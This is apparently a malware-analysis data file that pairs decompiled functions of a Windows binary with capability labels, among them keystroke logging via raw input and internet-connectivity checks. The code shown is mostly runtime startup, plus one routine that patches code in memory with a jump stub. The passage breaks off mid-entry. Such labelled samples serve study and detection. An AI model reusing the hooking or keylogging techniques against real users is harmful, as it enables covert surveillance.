{
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "14000118": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140001180(void)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int32_t *piVar6;\n    uint64_t *puVar7;\n    int32_t *piVar8;\n    ulong uVar9;\n    code *pcVar10;\n    ulong uVar11;\n    char **ppcVar12;\n    char *pcVar13;\n    ulong *puVar14;\n    int64_t iVar15;\n    uint64_t uVar16;\n    bool bVar17;\n    int64_t iVar18;\n    int64_t iVar19;\n    ulong *puVar20;\n    int64_t in_GS_OFFSET;\n    ulong auStack152 [7];\n    uint8_t uStack92;\n    uint16_t uStack88;\n    \n    piVar6 = *0x14006e7b0;\n    puVar20 = auStack152;\n    for (iVar18 = 0xd; iVar18 != 0; iVar18 = iVar18 + -1) {\n        *puVar20 = 0;\n        puVar20 = puVar20 + 1;\n    }\n    if (**0x14006e7b0 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack152);\n    }\n    pcVar10 = _sym.imp.KERNEL32.dll_Sleep;\n    puVar7 = *0x14006e800;\n    uVar16 = *(*(in_GS_OFFSET + 0x30) + 8);\n    while( true ) {\n        LOCK();\n        uVar5 = *puVar7;\n        *puVar7 = *puVar7 ^ (uVar5 == 0) * (*puVar7 ^ uVar16);\n        uVar9 = _str._0_a_;\n        uVar11 = *0x14006e850;\n        piVar8 = *0x14006e810;\n        uVar5 = (uVar5 != 0) * *puVar7;\n        if (uVar5 == 0) break;\n        if (uVar16 == uVar5) {\n            bVar17 = true;\n            iVar4 = **0x14006e810;\n            goto joined_r0x000140001401;\n        }\n        (*pcVar10)(1000);\n    }\n    bVar17 = false;\n    iVar4 = **0x14006e810;\njoined_r0x000140001401:\n    if (iVar4 == 1) {\n        sub.msvcrt.dll__amsg_exit(0x1f);\n        iVar4 = *piVar8;\n    }\n    else {\n        if (**0x14006e810 == 0) {\n            **0x14006e810 = 1;\n            sub.msvcrt.dll__initterm(uVar11, uVar9);\n        }\n        else {\n            *0x14007101c = 1;\n        }\n        iVar4 = *piVar8;\n    }\n    if (iVar4 == 1) {\n        sub.msvcrt.dll__initterm(*0x14006e830, *0x14006e840);\n        *piVar8 = 2;\n    }\n    if (!bVar17) {\n        *puVar7 = 0;\n    }\n    if (**0x14006e750 != NULL) {\n        (***0x14006e750)(0, 2);\n    }\n    fcn.140001f80();\n    uVar11 = (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(*0x14006e8a0);\n    **0x14006e7f0 = uVar11;\n    fcn.140007a20(0x140001000);\n    fcn.140001d90();\n    *0x140071010 = *0x14006e760;\n    ppcVar12 = fcn.140007a00();\n    iVar4 = *0x140071038;\n    bVar17 = false;\n    pcVar13 = *ppcVar12;\n    if (pcVar13 != NULL) {\n        do {\n            cVar3 = *pcVar13;\n            if (cVar3 < '!') {\n                *0x140071008 = pcVar13;\n                if (cVar3 == '\\0') break;\n                if (!bVar17) goto code_r0x0001400012d0;\n                bVar17 = true;\n            }\n            else if (cVar3 == '\\\"') {\n                bVar17 = bVar17 ^ 1;\n            }\n            pcVar13 = pcVar13 + 1;\n        } while( true );\n    }\n    goto code_r0x0001400012f0;\ncode_r0x0001400012d0:\n    if (cVar3 != '\\0') {\n        do {\n            pcVar2 = pcVar13 + 1;\n            pcVar13 = pcVar13 + 1;\n            *0x140071008 = pcVar13;\n            if (*pcVar2 == '\\0') break;\n        } while (*pcVar2 < '!');\n    }\ncode_r0x0001400012f0:\n    if ((*piVar6 != 0) && (*0x140009000 = 10,  (uStack92 & 1) != 0)) {\n        *0x140009000 = uStack88;\n    }\n    iVar1 = *0x140071038 + 1;\n    puVar14 = sub.msvcrt.dll_malloc();\n    iVar18 = *0x140071030;\n    puVar20 = puVar14;\n    if (0 < iVar4) {\n        iVar19 = 0;\n        do {\n            iVar15 = sub.msvcrt.dll_strlen(*(iVar18 + iVar19));\n            uVar11 = sub.msvcrt.dll_malloc(iVar15 + 1);\n            *(puVar14 + iVar19) = uVar11;\n            puVar20 = iVar18 + iVar19;\n            iVar19 = iVar19 + 8;\n            sub.msvcrt.dll_memcpy(uVar11, *puVar20, iVar15 + 1);\n        } while (iVar19 != iVar1 * 8 + -8);\n        puVar20 = iVar19 + puVar14;\n    }\n    *puVar20 = 0;\n    *0x140071030 = puVar14;\n    fcn.140001b90();\n    ***0x14006e770 = *0x140071028;\n    uVar16 = fcn.140008170();\n    *0x140071024 = uVar16;\n    if (*0x140071020 == 0) {\n        sub.msvcrt.dll_exit(uVar16 & 0xffffffff);\n        **0x14006e7b0 = 1;\n        uVar16 = fcn.140001180();\n        return uVar16;\n    }\n    if (*0x14007101c == 0) {\n        sub.msvcrt.dll__cexit();\n        return *0x140071024;\n    }\n    return uVar16;\n}\n",
        "token_count": 1540
    },
    "1400014f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.1400014f0(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll__onexit();\n    return -(iVar1 == 0);\n}\n",
        "token_count": 46
    },
    "14000158": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140001586(int64_t arg1)\n\n{\n    if ((0 < *0x140009030) && (0 < *0x140009034)) {\n        *(arg1 + *0x140009030) = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n        *(arg1 + *0x140009034) = _sym.imp.KERNEL32.dll_GetProcAddress;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "1400015b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1400015b8(uint *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    ushort uStack72;\n    ushort uStack70;\n    uint32_t uStack68;\n    ushort uStack64;\n    uint32_t uStack62;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (arg3 == 2) {\n        *0x140071060 = 0x10;\n        *0x140071064 = *arg1;\n        *0x140071068 = arg1[1];\n        *0x14007106c = arg1[2];\n        *0x140071070 = arg1[3];\n        uStack62 = uStack62 & 0xff000000 | 0xe2ff41;\n        uStack70 = arg2;\n        uStack68 = arg2 >> 0x10;\n        uStack64 = arg2 >> 0x30;\n        *0x140071074 = CONCAT22(uStack70, 0xba49);\n        *0x140071079 = arg2 >> 0x18;\n        *0x140071078 = uStack68 & 0xff | *0x140071079 << 8;\n        *0x14007107c = CONCAT35(0xe2ff41, arg2 >> 0x18) >> 0x18;\n        *0x140071080 = arg1[3] & 0xffffff00 | 0xe2;\n    }\n    uVar5 = *0x140071060;\n    uStack72 = 0;\n    uStack70 = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(arg1, uVar5, 0x40, &uStack72);\n    if (uVar3 != 0) {\n        puVar6 = 0x140071064;\n        if (arg3 != 0) {\n            puVar6 = 0x140071074;\n        }\n        bVar8 = *0x140071088 == NULL;\n        puVar7 = arg1;\n        for (uVar4 = uVar5; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        if (bVar8) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"ntdll\");\n            *0x140071088 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3, \"NtFlushInstructionCache\");\n        }\n        pcVar1 = *0x140071088;\n        if (*0x140071088 != NULL) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            (*pcVar1)(uVar3, arg1, uVar5);\n        }\n        (*pcVar2)(arg1, uVar5, CONCAT22(uStack70, uStack72), &uStack72);\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 745
    },
    "140001b9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.140001b90(void)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    code **ppcVar5;\n    \n    if (*0x1400710e0 == 0) {\n        *0x1400710e0 = 1;\n        uVar2 = **0x14006e720;\n        if (uVar2 == 0xffffffff) {\n            uVar4 = 0;\n            do {\n                uVar2 = uVar4;\n                uVar4 = uVar2 + 1;\n            } while ((*0x14006e720)[uVar4] != 0);\n        }\n        if (uVar2 != 0) {\n            ppcVar5 = *0x14006e720 + uVar2;\n            ppcVar1 = *0x14006e720 + (uVar2 - (uVar2 - 1)) + -1;\n            do {\n                (**ppcVar5)();\n                ppcVar5 = ppcVar5 + -1;\n            } while (ppcVar5 != ppcVar1);\n        }\n        iVar3 = sub.msvcrt.dll__onexit(0x140001ae0);\n        return -(iVar3 == 0);\n    }\n    return *0x1400710e0;\n}\n",
        "token_count": 303
    },
    "140001f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.140001f80(ulong param_1, ulong param_2, ulong param_3, ulong param_4, ulong param_5, ulong param_6, \n                  int64_t *param_7, int64_t param_8)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ulong uVar6;\n    uint32_t *puVar7;\n    code *pcVar8;\n    uint32_t uVar9;\n    int64_t iVar10;\n    int64_t *piVar11;\n    int32_t *piVar12;\n    uint uVar13;\n    uint32_t uVar14;\n    uint64_t arg2;\n    uint32_t *puVar15;\n    int64_t iVar16;\n    int64_t iVar17;\n    int64_t *arg1;\n    int32_t iVar18;\n    ulong var_8h;\n    ulong auStack232 [5];\n    uint auStack192 [2];\n    uint64_t uStack184;\n    uchar auStack176 [16];\n    ulong auStack160 [7];\n    int64_t aiStack104 [2];\n    uchar auStack88 [12];\n    uchar auStack76 [12];\n    ulong var_4h;\n    \n    iVar18 = *0x140071150;\n    if (*0x140071150 != 0) {\n        return;\n    }\n    *0x140071150 = 1;\n    auStack160[2] = 0x140001fc7;\n    fcn.1400028e0();\n    auStack160[2] = 0x140001fde;\n    iVar10 = fcn.140002b40(param_5);\n    iVar16 = *0x14006e760;\n    puVar7 = *0x14006e730;\n    *0x140071154 = 0;\n    iVar10 = -iVar10;\n    *0x140071158 = &stack0xffffffffffffffa8 + iVar10;\n    if (*0x14006e730 - *0x14006e740 < 8) {\n        *0x140071154 = 0;\n        return;\n    }\n    puVar15 = *0x14006e740;\n    if (*0x14006e730 - *0x14006e740 < 0xc) {\ncode_r0x00014000201d:\n        if (*puVar15 == 0) {\n            uVar9 = puVar15[1];\ncode_r0x00014000202a:\n            if (uVar9 == 0) {\n                arg2 = puVar15[2];\n                if (puVar15[2] != 1) {\ncode_r0x0001400022ce:\n                    uVar13 = 0x4006e280;\n                    *(&stack0xffffffffffffff70 + iVar10) = 0x1400022da;\n                    fcn.140001da0(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2, param_7, param_8);\n                    if (*0x140071160 != NULL) {\n                        *(&stack0xffffffffffffff40 + iVar10) = uVar13;\n                        *(&stack0xffffffffffffff48 + iVar10) = arg2;\n                        *(&stack0xffffffffffffff50 + iVar10) = CONCAT88(param_4, param_3);\n                        *(&stack0xffffffffffffff60 + iVar10) = *(&stack0xffffffffffffffa0 + iVar10);\n                        *(&stack0xffffffffffffff18 + iVar10) = 0x140002318;\n                        (**0x140071160)(&stack0xffffffffffffff40 + iVar10);\n                    }\n                    return;\n                }\n                puVar15 = puVar15 + 3;\n                if (*0x14006e730 <= puVar15) {\n                    *0x140071154 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar9 = puVar15[2];\n                        piVar11 = *puVar15 + iVar16;\n                        arg2 = uVar9;\n                        param_8 = *piVar11;\n                        arg1 = puVar15[1] + iVar16;\n                        if ((uVar9 & 0xff) == 0x20) goto code_r0x0001400021f8;\n                        uVar14 = uVar9 & 0xff;\n                        if ((uVar9 & 0xff) < 0x21) break;\n                        if (uVar14 != 0x40) {\ncode_r0x0001400022c2:\n                            *(&stack0xffffffffffffff70 + iVar10) = 0x1400022ce;\n                            fcn.140001da0(\"  Unknown pseudo relocation bit size %d.\\n\", arg2, param_7, param_8);\n                            goto code_r0x0001400022ce;\n                        }\n                        iVar17 = (*arg1 - piVar11) + param_8;\n                        if (((uVar9 & 0xc0) == 0) && (-1 < iVar17)) goto code_r0x0001400021df;\n                        *(&stack0xffffffffffffff70 + iVar10) = 0x140002248;\n                        fcn.140001e10(arg1);\n                        *arg1 = iVar17;\ncode_r0x0001400020a5:\n                        puVar15 = puVar15 + 3;\n                        if (puVar7 <= puVar15) goto code_r0x000140002140;\n                    }\n                    if (uVar14 == 8) {\n                        uVar2 = *arg1;\n                        if (uVar2 < '\\0') {\n                            iVar17 = (uVar2 | 0xffffffffffffff00) - piVar11;\n                        }\n                        else {\n                            iVar17 = uVar2 - piVar11;\n                        }\n                        iVar17 = iVar17 + param_8;\n                        if (((uVar9 & 0xc0) == 0) && ((0xff < iVar17 || (iVar17 < -0x80)))) {\ncode_r0x0001400021df:\n                            do {\n                                *(&stack0xffffffffffffff98 + iVar10) = iVar17;\n                                uVar9 = 0x4006e2e8;\n                                *(&stack0xffffffffffffff70 + iVar10) = 0x1400021f3;\n                                param_7 = arg1;\n                                piVar11 = fcn.140001da0(\"%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.\\n\"\n                                                        , arg2, arg1, param_8);\ncode_r0x0001400021f8:\n                                uVar14 = *arg1;\n                                if (uVar14 < 0) {\n                                    iVar17 = (uVar14 | 0xffffffff00000000) - piVar11;\n                                }\n                                else {\n                                    iVar17 = uVar14 - piVar11;\n                                }\n                                iVar17 = iVar17 + param_8;\n                            } while (((uVar9 & 0xc0) == 0) && ((iVar17 < -0x80000000 || (0xffffffff < iVar17))));\n                            *(&stack0xffffffffffffff70 + iVar10) = 0x140002232;\n                            fcn.140001e10(arg1);\n                            *arg1 = iVar17;\n                        }\n                        else {\n                            *(&stack0xffffffffffffff70 + iVar10) = 0x1400020a2;\n                            fcn.140001e10(arg1);\n                            *arg1 = iVar17;\n                        }\n                        goto code_r0x0001400020a5;\n                    }\n                    if (uVar14 != 0x10) goto code_r0x0001400022c2;\n                    uVar3 = *arg1;\n                    if (uVar3 < 0) {\n                        iVar17 = (uVar3 | 0xffffffffffff0000) - piVar11;\n                    }\n                    else {\n                        iVar17 = uVar3 - piVar11;\n                    }\n                    iVar17 = iVar17 + param_8;\n                    if (((uVar9 & 0xc0) == 0) && ((iVar17 < -0x8000 || (0xffff < iVar17)))) goto code_r0x0001400021df;\n                    puVar15 = puVar15 + 3;\n                    *(&stack0xffffffffffffff70 + iVar10) = 0x14000212c;\n                    fcn.140001e10(arg1);\n                    *arg1 = iVar17;\n                } while (puVar15 < puVar7);\n                goto code_r0x000140002140;\n            }\n        }\n    }\n    else if (**0x14006e740 == 0) {\n        uVar9 = (*0x14006e740)[1];\n        if ((uVar9 | (*0x14006e740)[2]) == 0) {\n            puVar15 = *0x14006e740 + 3;\n            goto code_r0x00014000201d;\n        }\n        goto code_r0x00014000202a;\n    }\n    if (*0x14006e730 <= puVar15) {\n        *0x140071154 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar15 + 1;\n        uVar9 = *puVar15;\n        puVar15 = puVar15 + 2;\n        piVar12 = *puVar1 + iVar16;\n        iVar4 = *piVar12;\n        *(&stack0xffffffffffffff70 + iVar10) = 0x1400022b6;\n        fcn.140001e10(piVar12);\n        *piVar12 = uVar9 + iVar4;\n    } while (puVar15 < puVar7);\ncode_r0x000140002140:\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x140071154) {\n        iVar16 = 0;\n        do {\n            piVar12 = *0x140071158 + iVar16;\n            iVar4 = *piVar12;\n            if (iVar4 != 0) {\n                uVar5 = *(piVar12 + 4);\n                uVar6 = *(piVar12 + 2);\n                *(&stack0xffffffffffffff70 + iVar10) = 0x14000217f;\n                (*pcVar8)(uVar6, uVar5, iVar4, &stack0xffffffffffffffb4);\n            }\n            iVar18 = iVar18 + 1;\n            iVar16 = iVar16 + 0x28;\n        } while (iVar18 < *0x140071154);\n    }\n    return;\n}\n",
        "token_count": 2347
    },
    "14000264": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.140002640(ulong noname_0, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    if (arg2 != 2) {\n        if (arg2 < 3) {\n            if (arg2 == 0) {\n                if (*0x1400711a8 != 0) {\n                    fcn.1400024d0();\n                }\n                iVar2 = *0x1400711a0;\n                if (*0x1400711a8 == 1) {\n                    while (iVar2 != 0) {\n                        iVar1 = *(iVar2 + 0x10);\n                        sub.msvcrt.dll_free(iVar2);\n                        iVar2 = iVar1;\n                    }\n                    *0x1400711a0 = 0;\n                    *0x1400711a8 = 0;\n                    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x1400711c0);\n                }\n            }\n            else {\n                if (*0x1400711a8 == 0) {\n                    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x1400711c0);\n                }\n                *0x1400711a8 = 1;\n            }\n        }\n        else if ((arg2 == 3) && (*0x1400711a8 != 0)) {\n            fcn.1400024d0();\n        }\n        return 1;\n    }\n    fcn.140001d90();\n    return 1;\n}\n",
        "token_count": 329
    },
    "1400030d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400030d0(uint64_t arg1, uint64_t noname_1, int64_t *arg3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint8_t uVar4;\n    ulong arg1_00;\n    uchar *puVar5;\n    uchar *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uint32_t uVar10;\n    uint8_t uVar11;\n    int32_t iVar12;\n    uint8_t uVar13;\n    int32_t iVar14;\n    uint8_t *puVar15;\n    uint8_t uVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    bool bVar19;\n    ulong var_8h;\n    uchar auStack104 [32];\n    uint8_t auStack72 [8];\n    \n    uVar16 = arg1 & 0xffffffff;\n    iVar17 = arg1 & 0xffffffff;\n    if (arg1 == 0x6f) {\n        iVar18 = *(arg3 + 2);\n        uVar10 = *(arg3 + 1);\n        if ((uVar10 & 0x1000) != 0) {\n            arg1_00 = 3;\n            goto code_r0x000140003119;\n        }\n        iVar14 = *(arg3 + 0xc);\n        iVar3 = fcn.140002b40(arg1);\n        uVar4 = 3;\n        uVar11 = 7;\n        puVar6 = &stack0xffffffffffffff98 + -iVar3;\n        puVar9 = &stack0xffffffffffffffb8 + -iVar3;\ncode_r0x0001400031dd:\n        puVar5 = puVar6;\n        puVar15 = puVar9;\n        if (noname_1 == 0) goto code_r0x000140003178;\ncode_r0x0001400031e5:\n        puVar7 = puVar15;\n        do {\n            puVar9 = puVar7 + 1;\n            uVar1 = uVar11 & noname_1;\n            uVar13 = uVar1 + 0x30;\n            uVar1 = uVar1 + 0x37 | uVar16 & 0x20;\n            if (uVar13 < 0x3a) {\n                uVar1 = uVar13;\n            }\n            noname_1 = noname_1 >> (uVar4 & 0x3f);\n            *puVar7 = uVar1;\n            puVar7 = puVar9;\n        } while (noname_1 != 0);\n        puVar5 = puVar6;\n        if (puVar9 == puVar15) goto code_r0x000140003178;\n        if (iVar18 < 1) goto code_r0x00014000318a;\ncode_r0x00014000322b:\n        iVar2 = puVar9 - puVar15;\n        iVar12 = iVar18 - iVar2;\n        if (0 < iVar12) {\n            puVar7 = puVar9 + iVar12;\n            *(puVar6 + -8) = 0x140003256;\n            sub.msvcrt.dll_memset(puVar9, 0x30, iVar12);\n            goto code_r0x000140003256;\n        }\n        puVar7 = puVar9;\n        if (iVar17 == 0x6f) {\ncode_r0x000140003194:\n            if ((*(arg3 + 9) & 8) != 0) {\n                *puVar7 = 0x30;\n                puVar7 = puVar7 + 1;\n            }\n            goto code_r0x000140003256;\n        }\n        if (puVar9 == puVar15) goto code_r0x0001400034f8;\n        if (iVar2 < iVar14) {\n            uVar10 = *(arg3 + 1);\n            iVar14 = iVar14 - iVar2;\n            *(arg3 + 0xc) = iVar14;\n            if ((uVar10 & 0x800) == 0) goto code_r0x000140003309;\n            goto code_r0x0001400032e0;\n        }\n        *(arg3 + 0xc) = 0xffffffff;\ncode_r0x000140003280:\n        puVar8 = puVar9;\n        if ((*(arg3 + 9) & 8) != 0) {\n            *puVar9 = uVar16;\n            puVar8 = puVar9 + 2;\n            puVar9[1] = 0x30;\n        }\ncode_r0x000140003291:\n        iVar14 = -1;\n        puVar9 = puVar8;\n    }\n    else {\n        iVar18 = *(arg3 + 2);\n        uVar10 = *(arg3 + 1);\n        if ((uVar10 & 0x1000) == 0) {\n            iVar14 = *(arg3 + 0xc);\n            iVar3 = fcn.140002b40(arg1);\n            uVar4 = 4;\n            uVar11 = 0xf;\n            puVar6 = &stack0xffffffffffffff98 + -iVar3;\n            puVar9 = &stack0xffffffffffffffb8 + -iVar3;\n            goto code_r0x0001400031dd;\n        }\n        arg1_00 = 4;\ncode_r0x000140003119:\n        iVar14 = *(arg3 + 0xc);\n        iVar3 = fcn.140002b40(arg1_00);\n        uVar4 = arg1_00;\n        iVar3 = -iVar3;\n        puVar6 = &stack0xffffffffffffff98 + iVar3;\n        puVar9 = &stack0xffffffffffffffb8 + iVar3;\n        uVar11 = (iVar17 != 0x6f) * '\\b' + 7;\n        puVar5 = &stack0xffffffffffffff98 + iVar3;\n        puVar15 = puVar9;\n        if (noname_1 != 0) goto code_r0x0001400031e5;\ncode_r0x000140003178:\n        *(arg3 + 1) = uVar10 & 0xfffff7ff;\n        puVar6 = puVar5;\n        puVar7 = puVar9;\n        if (0 < iVar18) goto code_r0x00014000322b;\ncode_r0x00014000318a:\n        if (iVar17 == 0x6f) goto code_r0x000140003194;\ncode_r0x000140003256:\n        puVar9 = puVar7;\n        if ((puVar7 == puVar15) && (iVar18 != 0)) {\ncode_r0x0001400034f8:\n            *puVar9 = 0x30;\n            iVar2 = (puVar9 + 1) - puVar15;\n            puVar9 = puVar9 + 1;\n        }\n        else {\n            iVar2 = puVar7 - puVar15;\n        }\n        if (iVar14 <= iVar2) {\n            *(arg3 + 0xc) = 0xffffffff;\n            if (iVar17 == 0x6f) {\n                if (puVar9 <= puVar15) {\n                    return;\n                }\n                uVar10 = *(arg3 + 1);\n                iVar17 = -2;\n                iVar14 = -1;\n                goto code_r0x000140003360;\n            }\n            goto code_r0x000140003280;\n        }\n        iVar14 = iVar14 - iVar2;\n        uVar10 = *(arg3 + 1);\n        *(arg3 + 0xc) = iVar14;\n        if ((iVar17 == 0x6f) || (puVar7 = puVar9,  (uVar10 & 0x800) == 0)) {\n            if ((-1 < iVar18) || ((uVar10 & 0x600) != 0x200)) {\ncode_r0x000140003309:\n                iVar17 = iVar14 + -1;\n                if ((uVar10 & 0x400) == 0) {\n                    do {\n                        *(puVar6 + -8) = 0x14000332d;\n                        fcn.140002ca0(0x20, arg3);\n                        bVar19 = iVar17 != 0;\n                        iVar14 = iVar17 + -1;\n                        iVar17 = iVar14;\n                    } while (bVar19);\n                    iVar17 = -2;\n                    if (puVar15 < puVar9) goto code_r0x00014000335d;\n                    return;\n                }\n                if (puVar9 <= puVar15) goto code_r0x0001400033c4;\n                goto code_r0x000140003360;\n            }\n            puVar8 = puVar9 + iVar14;\n            *(puVar6 + -8) = 0x1400034d0;\n            sub.msvcrt.dll_memset(puVar9, 0x30, iVar14);\n            if (iVar17 != 0x6f) goto code_r0x0001400034da;\n            goto code_r0x000140003291;\n        }\ncode_r0x0001400032e0:\n        iVar14 = iVar14 + -2;\n        puVar8 = puVar7;\n        if (iVar14 < 1) {\ncode_r0x0001400032ed:\n            *puVar8 = uVar16;\n            puVar8[1] = 0x30;\n            puVar9 = puVar8 + 2;\n        }\n        else {\n            if ((-1 < iVar18) || ((uVar10 & 0x600) != 0x200)) {\n                *puVar7 = uVar16;\n                puVar9 = puVar7 + 2;\n                puVar7[1] = 0x30;\n                goto code_r0x000140003309;\n            }\n            puVar8 = puVar7 + iVar14;\n            *(puVar6 + -8) = 0x140003572;\n            sub.msvcrt.dll_memset(puVar7, 0x30, iVar14);\ncode_r0x0001400034da:\n            iVar14 = -1;\n            puVar9 = puVar8;\n            if ((uVar10 & 0x800) != 0) goto code_r0x0001400032ed;\n        }\n    }\n    if (puVar9 <= puVar15) {\n        return;\n    }\n    uVar10 = *(arg3 + 1);\n    iVar17 = iVar14 + -1;\ncode_r0x000140003360:\n    do {\n        puVar9 = puVar9 + -1;\n        if (((uVar10 & 0x4000) == 0) && (iVar18 = *(arg3 + 0x24),  *(arg3 + 5) == iVar18 || *(arg3 + 5) < iVar18)) {\ncode_r0x000140003352:\n            *(arg3 + 0x24) = iVar18 + 1;\n        }\n        else {\n            if ((uVar10 & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = *puVar9;\n                iVar18 = *(arg3 + 0x24);\n                goto code_r0x000140003352;\n            }\n            *(puVar6 + -8) = 0x140003387;\n            sub.msvcrt.dll_fputc();\n            *(arg3 + 0x24) = *(arg3 + 0x24) + 1;\n        }\n        iVar18 = iVar17;\n        if (puVar9 <= puVar15) {\n            while (iVar17 = iVar18,  0 < iVar14) {\n                uVar10 = *(arg3 + 1);\ncode_r0x0001400033c4:\n                if (((uVar10 & 0x4000) != 0) ||\n                   (iVar18 = *(arg3 + 0x24),  *(arg3 + 5) != iVar18 && iVar18 <= *(arg3 + 5))) {\n                    if ((uVar10 & 0x2000) == 0) {\n                        *(*arg3 + *(arg3 + 0x24)) = 0x20;\n                        iVar18 = *(arg3 + 0x24);\n                    }\n                    else {\n                        *(puVar6 + -8) = 0x1400033e9;\n                        sub.msvcrt.dll_fputc(0x20);\n                        iVar18 = *(arg3 + 0x24);\n                    }\n                }\n                *(arg3 + 0x24) = iVar18 + 1;\n                iVar18 = iVar17 + -1;\n                iVar14 = iVar17;\n            }\n            return;\n        }\ncode_r0x00014000335d:\n        uVar10 = *(arg3 + 1);\n    } while( true );\n}\n",
        "token_count": 2868
    },
    "14000358": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
